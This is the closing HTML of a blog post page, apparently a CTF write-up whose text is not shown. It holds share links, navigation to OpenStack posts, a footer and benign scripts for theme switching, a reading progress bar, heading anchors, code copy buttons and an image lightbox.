d="m8 20 4-9M10.7 14c.437 1.263 1.43 2 2.55 2 2.071 0 3.75-1.554 3.75-4a5 5 0 1 0-9.7 1.7" /><path d="M3 12a9 9 0 1 0 18 0 9 9 0 1 0-18 0" /></svg><span class="sr-only">Share this post on Pinterest</span></a><a href="mailto:?subject=See%20this%20post&amp;body=https://synex.space/posts/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-writeup/" title="Share this post via email" target="_blank" rel="noopener noreferrer" class="group inline-flex items-center gap-1 hover:text-accent scale-90 p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M3 7a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" /><path d="m3 7 9 6 9-6" /></svg><span class="sr-only">Share this post via email</span></a></div></div><hr class="my-8 border-dashed"><div data-pagefind-ignore class="my-8 grid grid-cols-1 gap-6 sm:grid-cols-2"><a href="/posts/openstack-网络-flat与vxlan/" class="flex w-full gap-1 hover:opacity-75"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block flex-none rtl:rotate-180" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M5 12h14M5 12l6 6M5 12l6-6" /></svg><div><span>Previous Post</span><div class="text-accent/85 text-sm">OpenStack-网络-FLAT与VXLAN</div></div></a><a href="/posts/openstack-cinder块存储-对接lvmnfsceph/" class="flex w-full justify-end gap-1 text-end hover:opacity-75 sm:col-start-2"><div><span>Next Post</span><div class="text-accent/85 text-sm">OpenStack-Cinder块存储-对接LVM、NFS、CEPH</div></div><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block flex-none rtl:rotate-180" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M5 12h14M13 18l6-6M13 6l6 6" /></svg></a></div></main><footer class="app-layout mt-auto"><div class="border-border flex flex-col items-center justify-between border-t py-6 sm:flex-row-reverse sm:py-4"><div class="flex flex-wrap items-center gap-1"><a href="https://github.com/Synex93" title="Syn3x's Blog on Github" class="group inline-flex items-center gap-1 hover:text-accent p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6 0 0 0-1.3-3.2 4.2 4.2 0 0 0-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3 0 0 0-6.2 0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2 0 0 0-.1 3.2A4.6 4.6 0 0 0 4 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21" /></svg><span class="sr-only">Syn3x&#39;s Blog on Github</span></a><a href="mailto:me@synex.space" title="Send an email to Syn3x's Blog" class="group inline-flex items-center gap-1 hover:text-accent p-2 hover:rotate-6 sm:p-1"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="inline-block size-6 scale-125 fill-transparent stroke-current stroke-2 opacity-90 group-hover:fill-transparent sm:scale-110" viewBox="0 0 24 24"><path stroke="none" d="M0 0h24v24H0z" /><path d="M3 7a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" /><path d="m3 7 9 6 9-6" /></svg><span class="sr-only">Send an email to Syn3x&#39;s Blog</span></a></div><div class="my-2 whitespace-nowrap"><span>Copyright &#169; 2026 Syn3x. All rights reserved.</span></div></div></footer><script type="module">var e=`theme`,t=`light`,n=`dark`;function r(){return localStorage.getItem(e)||(window.matchMedia(`(prefers-color-scheme: dark)`).matches?n:t)}var i=window.__theme?.value??r();function a(){localStorage.setItem(e,i),o()}function o(){let e=document.firstElementChild;e?.setAttribute(`data-theme`,i),e?.classList.toggle(`dark`,i===n),document.querySelector(`#theme-btn`)?.setAttribute(`aria-label`,i);let t=window.getComputedStyle(document.body).backgroundColor;document.querySelector(`meta[name='theme-color']`)?.setAttribute(`content`,t)}function s(){o(),document.querySelector(`#theme-btn`)?.addEventListener(`click`,()=>{i=i===t?n:t,a()})}s(),document.addEventListener(`astro:after-swap`,s),document.addEventListener(`astro:before-swap`,e=>{let t=document.querySelector(`meta[name='theme-color']`)?.getAttribute(`content`);t&&e.newDocument.querySelector(`meta[name='theme-color']`)?.setAttribute(`content`,t)}),window.matchMedia(`(prefers-color-scheme: dark)`).addEventListener(`change`,({matches:e})=>{i=e?n:t,a()});</script></body></html><script data-astro-rerun>
+  function createProgressBar() {
+    const progressContainer = document.createElement("div");
+    progressContainer.className =
+      "progress-container fixed top-0 z-10 h-1 w-full bg-background";
+
+    const progressBar = document.createElement("div");
+    progressBar.className = "progress-bar h-1 w-0 bg-accent";
+    progressBar.id = "myBar";
+
+    progressContainer.appendChild(progressBar);
+    document.body.appendChild(progressContainer);
+  }
+  createProgressBar();
+
+  function updateScrollProgress() {
+    document.addEventListener("scroll", () => {
+      const winScroll =
+        document.body.scrollTop || document.documentElement.scrollTop;
+      const height =
+        document.documentElement.scrollHeight -
+        document.documentElement.clientHeight;
+      const scrolled = (winScroll / height) * 100;
+      if (document) {
+        const myBar = document.getElementById("myBar");
+        if (myBar) {
+          myBar.style.width = scrolled + "%";
+        }
+      }
+    });
+  }
+  updateScrollProgress();
+
+  function addHeadingLinks() {
+    const headings = Array.from(
+      document.querySelectorAll("h2, h3, h4, h5, h6")
+    );
+    for (const heading of headings) {
+      heading.classList.add("group");
+      const link = document.createElement("a");
+      link.className =
+        "heading-link ms-2 no-underline opacity-75 md:opacity-0 md:group-hover:opacity-100 md:focus:opacity-100";
+      link.href = "#" + heading.id;
+
+      const span = document.createElement("span");
+      span.ariaHidden = "true";
+      span.innerText = "#";
+      link.appendChild(span);
+      heading.appendChild(link);
+    }
+  }
+  addHeadingLinks();
+
+  function attachCopyButtons() {
+    const copyButtonLabel = "Copy";
+    const codeBlocks = Array.from(document.querySelectorAll("pre"));
+
+    for (const codeBlock of codeBlocks) {
+      const wrapper = document.createElement("div");
+      wrapper.style.position = "relative";
+
+      const computedStyle = getComputedStyle(codeBlock);
+      const hasFileNameOffset =
+        computedStyle.getPropertyValue("--file-name-offset").trim() !== "";
+
+      const topClass = hasFileNameOffset
+        ? "top-(--file-name-offset)"
+        : "-top-3";
+
+      const copyButton = document.createElement("button");
+      copyButton.className = `copy-code absolute end-3 ${topClass} rounded bg-muted border border-muted px-2 py-1 text-xs leading-4 text-foreground font-medium`;
+      copyButton.innerHTML = copyButtonLabel;
+      codeBlock.setAttribute("tabindex", "0");
+      codeBlock.appendChild(copyButton);
+
+      codeBlock?.parentNode?.insertBefore(wrapper, codeBlock);
+      wrapper.appendChild(codeBlock);
+
+      copyButton.addEventListener("click", async () => {
+        await copyCode(codeBlock, copyButton);
+      });
+    }
+
+    async function copyCode(block, button) {
+      const code = block.querySelector("code");
+      const text = code?.innerText;
+
+      await navigator.clipboard.writeText(text ?? "");
+
+      button.innerText = "Copied";
+
+      setTimeout(() => {
+        button.innerText = copyButtonLabel;
+      }, 700);
+    }
+  }
+  attachCopyButtons();
+
+  /** Accessible image lightbox for article images. */
+  function initLightbox() {
+    const article = document.getElementById("article");
+    if (!article) return;
+
+    const prefersReducedMotion = () =>
+      window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+
+    let overlay = null;
+    let lastFocused = null;
+
+    // Defer attribute mutations so they don't push the LCP timestamp.
+    // Event listeners below use delegation and don't need the attributes to exist yet.
+    requestAnimationFrame(() => {
+      const images = Array.from(article.querySelectorAll("img"));
+      for (const image of images) {
+        if (image.closest("a")) continue;
+        image.setAttribute("role", "button");
+        image.setAttribute("tabindex", "0");
+        image.setAttribute("aria-haspopup", "dialog");
+        image.setAttribute(
+          "aria-label",
+          image.alt ? `Zoom image: ${image.alt}` : "Zoom image"
+        );
+      }
+    });
+
+    function open(src, alt, trigger) {
+      if (overlay) return;
+      lastFocused = trigger ?? document.activeElement;
+
+      overlay = document.createElement("div");
+      overlay.setAttribute("role", "dialog");
+      overlay.setAttribute("aria-modal", "true");
+      overlay.setAttribute(
+        "aria-label",
+        alt ? `Image preview: ${alt}` : "Image preview"
+      );
+      overlay.className =
+        "fixed inset-0 z-50 flex cursor-zoom-out items-center justify-center bg-black/70 backdrop-blur-sm opacity-0 transition-opacity duration-200 motion-reduce:transition-none";
+
+      const closeButton = document.createElement("button");
+      closeButton.type = "button";
+      closeButton.setAttribute("aria-label", "Close image preview");
+      closeButton.className =
+        "absolute end-4 top-4 rounded p-2 text-3xl leading-none text-white";
+      closeButton.innerHTML = "&#10005;";
+      closeButton.addEventListener("click", close);
+
+      const image = document.createElement("img");
+      image.src = src;
+      image.alt = "";
+      image.className =
+        "max-h-[90dvh] max-w-[90dvw] cursor-default object-contain";
+
+      overlay.append(closeButton, image);
+      overlay.addEventListener("click", e => {
+        if (e.target === overlay && currentScale <= 1) close();
+      });
+
+      let currentScale = 1;
+      let translateX = 0;
+      let translateY = 0;
+      let initialDist = 0;
+      let initialScale = 1;
+      let panStartX = 0;
+      let panStartY = 0;
+      let panStartTranslateX = 0;
+      let panStartTranslateY = 0;
+      let lastTapTime = 0;
+
+      function applyTransform() {
+        image.style.transform = `scale(${currentScale}) translate(${translateX}px, ${translateY}px)`;
+      }
+
+      function resetTransform() {
+        currentScale = 1;
+        translateX = 0;
+        translateY = 0;
+        image.style.transform = "";
+      }
+
+      overlay.addEventListener(
+        "touchstart",
+        e => {
+          const t = e.touches;
+          if (t.length === 2) {
+            initialDist = Math.hypot(
+              t[1].clientX - t[0].clientX,
+              t[1].clientY - t[0].clientY
+            );
+            initialScale = currentScale;
+          } else if (t.length === 1) {
+            const now = Date.now();
+            if (now - lastTapTime < 300) {
+              e.preventDefault();
+              if (currentScale > 1) {
+                resetTransform();
+              } else {
+                currentScale = 2;
+                translateX = 0;
+                translateY = 0;
+                applyTransform();
+              }
+              lastTapTime = 0;
+              panStartX = t[0].clientX;
+              panStartY = t[0].clientY;
+              panStartTranslateX = translateX;
+              panStartTranslateY = translateY;
+            } else {
+              lastTapTime = now;
+              if (currentScale > 1) {
+                panStartX = t[0].clientX;
+                panStartY = t[0].clientY;
+                panStartTranslateX = translateX;
+                panStartTranslateY = translateY;
+              }
+            }
+          }
+        },
+        { passive: false }
+      );
+
+      overlay.addEventListener(
+        "touchmove",
+        e => {
+          const t = e.touches;
+          if (t.length === 2) {
+            e.preventDefault();
+            const dist = Math.hypot(
+              t[1].clientX - t[0].clientX,
+              t[1].clientY - t[0].clientY
+            );
+            currentScale = Math.min(
+              4,
+              Math.max(1, initialScale * (dist / initialDist))
+            );
+            applyTransform();
+          } else if (t.length === 1) {
+            if (currentScale > 1) {
+              e.preventDefault();
+              translateX =
+                panStartTranslateX + (t[0].clientX - panStartX) / currentScale;
+              translateY =
+                panStartTranslateY + (t[0].clientY - panStartY) / currentScale;
+              const maxX = Math.max(
+                0,
+                (image.clientWidth - overlay.clientWidth / currentScale) / 2
+              );
+              const maxY = Math.max(
+                0,
+                (image.clientHeight - overlay.clientHeight / currentScale) / 2
+              );
+              translateX = Math.min(maxX, Math.max(-maxX, translateX));
+              translateY = Math.min(maxY, Math.max(-maxY, translateY));
+              applyTransform();
+            } else {
+              e.preventDefault();
+            }
+          }
+        },
+        { passive: false }
+      );
+
+      overlay.addEventListener("touchend", e => {
+        if (e.touches.length === 0 && currentScale <= 1.05) {
+          resetTransform();
+        }
+      });
+
+      overlay.addEventListener("touchcancel", e => {
+        if (e.touches.length === 0 && currentScale <= 1.05) {
+          resetTransform();
+        }
+      });
+
+      document.body.appendChild(overlay);
+      document.body.style.overflow = "hidden";
+      document.addEventListener("keydown", onKeyDown);
+      window.__closeLightbox = close;
+
+      requestAnimationFrame(() => overlay?.classList.add("opacity-100"));
+      closeButton.focus();
+    }
+
+    function close() {
+      if (!overlay) return;
+      const el = overlay;
+      overlay = null;
+      window.__closeLightbox = null;
+
+      document.removeEventListener("keydown", onKeyDown);
+      document.body.style.overflow = "";
+      lastFocused?.focus();
+      lastFocused = null;
+
+      if (prefersReducedMotion()) {
+        el.remove();
+        return;
+      }
+      const remove = () => el.remove();
+      el.addEventListener("transitionend", remove, { once: true });
+      setTimeout(remove, 250); // fallback in case transitionend never fires
+      el.classList.remove("opacity-100");
+    }
+
+    function onKeyDown(e) {
+      if (e.key === "Escape") {
+        close();
+      } else if (e.key === "Tab") {
+        trapFocus(e);
+      }
+    }
+
+    // Keep keyboard focus inside the open dialog.
+    function trapFocus(e) {
+      if (!overlay) return;
+      const focusables = overlay.querySelectorAll(
+        'a[href], button, [tabindex]:not([tabindex="-1"])'
+      );
+      if (focusables.length === 0) return;
+      const first = focusables[0];
+      const last = focusables[focusables.length - 1];
+      if (e.shiftKey && document.activeElement === first) {
+        e.preventDefault();
+        last.focus();
+      } else if (!e.shiftKey && document.activeElement === last) {
+        e.preventDefault();
+        first.focus();
+      }
+    }
+
+    function triggerFromEvent(e) {
+      const image = e.target.closest("img");
+      if (!image || !article.contains(image) || image.closest("a")) return null;
+      return image;
+    }
+
+    function activate(image) {
+      open(image.currentSrc || image.src, image.alt, image);
+    }
+
+    article.addEventListener("click", e => {
+      const image = triggerFromEvent(e);
+      if (!image) return;
+      e.preventDefault();
+      activate(image);
+    });
+
+    article.addEventListener("keydown", e => {
+      if (e.key !== "Enter" && e.key !== " " && e.key !== "Spacebar") return;
+      const image = triggerFromEvent(e);
+      if (!image) return;
+      e.preventDefault();
+      activate(image);
+    });
+  }
+  initLightbox();
+
+  if (!window.__lightboxSwapBound) {
+    window.__lightboxSwapBound = true;
+    document.addEventListener("astro:before-swap", () =>
+      window.__closeLightbox?.()
+    );
+  }
+
+  document.addEventListener("astro:after-swap", () =>
+    window.scrollTo({ left: 0, top: 0, behavior: "instant" })
+  );
+</script>
